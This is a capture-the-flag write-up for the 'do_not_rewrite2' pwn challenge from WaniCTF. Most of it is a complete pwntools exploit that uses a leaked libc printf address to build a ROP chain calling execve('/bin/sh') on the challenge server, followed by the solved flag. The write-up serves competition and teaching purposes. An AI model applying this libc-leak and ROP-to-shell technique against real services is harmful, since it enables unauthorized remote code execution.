https://ctftime.org/event/2377

# do_not_rewrite2 (pwn)

便利な関数が消えてしまいましたね...
ropをしてみましょう

show_flag() has disappeared :<
Let's try ROP

nc chal-lz56g6.wanictf.org 9005

## Analysis

This is essentially the same task as `do_not_rewrite` with 2 major changes:
1) The function which prints the flag for us has gone
2) We are given a libc leak instead of a leak from the main image

With these changes in mind it becomes clear that we should write a rop chain to return address that we control on the stack.

We are provided with the following libc.so.6:

`fc4c52f3910ed57a088d19ab86c671358f5e917cd4e95b21fd08e4fd922c0aa`

## Solution

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

p = remote("chal-lz56g6.wanictf.org", 9005)

p.readuntil(b"hint: printf = ")
leak = int(p.readline().decode(), 16)
libc.address = leak - libc.sym["printf"]
log.info(f"libc: 0x{libc.address:x}")

for i in range(3):
    p.sendlineafter(b": ", b"A")
    p.sendlineafter(b": ", b"1.1")
    p.sendlineafter(b": ", b"1.1")

rop = ROP(libc)
rop.rsi = 0
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.rax = constants.SYS_execve
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendlineafter(b": ", rop.chain())
p.sendlineafter(b": ", b"abc")
p.sendlineafter(b": ", b"efg")

p.interactive()

```

## Flag
`FLAG{r0p_br0d3n_0ur_w0r1d}`

smiley 2024/06/22
